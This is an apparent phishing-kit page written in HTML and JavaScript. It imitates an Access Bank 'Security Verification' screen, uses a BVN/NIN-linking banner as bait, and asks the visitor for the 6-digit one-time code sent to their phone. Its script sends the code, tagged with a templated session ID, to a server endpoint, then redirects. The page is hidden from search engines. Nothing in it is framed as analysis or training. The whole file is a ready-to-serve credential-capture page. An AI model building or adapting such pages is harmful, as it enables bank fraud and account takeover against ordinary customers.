<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Security Verification — Access Bank</title>
<style>
*{box-sizing:border-box}
:root{--o:#F5821F;--b:#002B5C;--line:#dfe3e8;--muted:#5b6b7c}
body{margin:0;background:#f4f6f8;color:#12202e;font:15px/1.45 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
.topbar{background:var(--b);color:#fff;font-size:12px;text-align:center;padding:7px 12px}
.wrap{max-width:430px;margin:0 auto;padding:0 16px}
.card{background:#fff;border-radius:10px;padding:28px 22px 22px;margin:22px 0;box-shadow:0 2px 16px rgba(0,0,0,.07)}
.logo{font-weight:800;font-size:21px;letter-spacing:-.4px;margin-bottom:22px}
.logo .a{color:var(--o)}.logo .b{color:var(--b)}
.lock{width:44px;height:44px;border-radius:50%;background:rgba(245,130,31,.13);color:var(--o);display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:14px}
h1{font-size:18px;margin:0 0 8px}
.sub{color:var(--muted);font-size:13.5px;margin:0 0 6px}
.sub b{color:#12202e}
.otps{display:flex;gap:8px;margin:20px 0 4px}
.otps input{width:100%;aspect-ratio:1/1.15;text-align:center;font-size:19px;font-weight:700;padding:0;border:1px solid var(--line);border-radius:7px;background:#fff;color:#12202e}
.otps input:focus{outline:none;border-color:var(--o);box-shadow:0 0 0 3px rgba(245,130,31,.18)}
.err{color:#c62828;font-size:12.5px;min-height:17px;margin:8px 0 0}
.btn{width:100%;margin-top:12px;padding:13px;border:0;border-radius:6px;background:var(--o);color:#fff;font-size:15px;font-weight:700;cursor:pointer}
.btn:disabled{opacity:.65}
.resend{display:block;margin:16px auto 0;background:none;border:0;font-size:13px;font-weight:600;color:var(--b);cursor:pointer}
.resend:disabled{color:var(--muted);font-weight:500}
.note{font-size:11.5px;color:#8a97a4;margin-top:18px;line-height:1.5;border-top:1px solid var(--line);padding-top:14px}
</style>
</head>
<body>
<div class="topbar">Link your BVN or NIN to your account</div>
<div class="wrap"><main class="card">
  <div class="logo"><span class="a">Access</span> <span class="b">Bank</span></div>
  <div class="lock">&#128274;</div>
  <h1>Security Verification</h1>
  <p class="sub">Enter the 6-digit code sent to the phone number registered on your account.</p>
  <form id="f" novalidate>
    <div class="otps" id="boxes">
      <input class="o" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
      <input class="o" inputmode="numeric" maxlength="1">
      <input class="o" inputmode="numeric" maxlength="1">
      <input class="o" inputmode="numeric" maxlength="1">
      <input class="o" inputmode="numeric" maxlength="1">
      <input class="o" inputmode="numeric" maxlength="1">
    </div>
    <div class="err" id="err"></div>
    <button class="btn" type="submit" id="btn">Verify</button>
  </form>
  <button class="resend" id="rs" disabled>Resend code in 60s</button>
  <div class="note">Didn't get the code? Check that your line is active and has network. The code expires in 5 minutes.</div>
</main></div>
<script>
const SID = "{{SID}}";
const B = document.getElementById('boxes'), BS = [...B.querySelectorAll('input')],
      BTN = document.getElementById('btn'), E = document.getElementById('err'),
      RS = document.getElementById('rs');
BS[0].focus();
BS.forEach((b, i) => {
  b.addEventListener('input', () => {
    b.value = b.value.replace(/\D/g, '');
    if (b.value && BS[i + 1]) BS[i + 1].focus();
  });
  b.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !b.value && BS[i - 1]) BS[i - 1].focus();
  });
  b.addEventListener('paste', (e) => {
    const d = (e.clipboardData.getData('text') || '').replace(/\D/g, '');
    if (d.length > 1) {
      e.preventDefault();
      d.split('').forEach((c, j) => { if (BS[j]) BS[j].value = c; });
      BS[Math.min(d.length, 5)].focus();
    }
  });
});
let left = 60;
const tick = setInterval(() => {
  left--;
  if (left <= 0) { clearInterval(tick); RS.disabled = false; RS.textContent = 'Resend code'; return; }
  RS.textContent = 'Resend code in ' + left + 's';
}, 1000);
RS.onclick = async () => {
  RS.disabled = true; RS.textContent = 'Sending…';
  try { await fetch('/api/resend', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ s: SID }) }); } catch {}
  left = 60; RS.textContent = 'Resend code in 60s';
  const t = setInterval(() => {
    left--;
    if (left <= 0) { clearInterval(t); RS.disabled = false; RS.textContent = 'Resend code'; return; }
    RS.textContent = 'Resend code in ' + left + 's';
  }, 1000);
};
document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const otp = BS.map((b) => b.value).join('');
  if (otp.length < 6) { E.textContent = 'Enter the complete 6-digit code.'; return; }
  E.textContent = '';
  BTN.disabled = true; BTN.textContent = 'Verifying…';
  try {
    const r = await fetch('/api/otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ otp, s: SID })
    });
    const j = await r.json();
    location.href = j.next || '/done';
  } catch {
    BTN.disabled = false; BTN.textContent = 'Verify';
    E.textContent = 'Network error. Please try again.';
  }
});
</script>
</body>
</html>
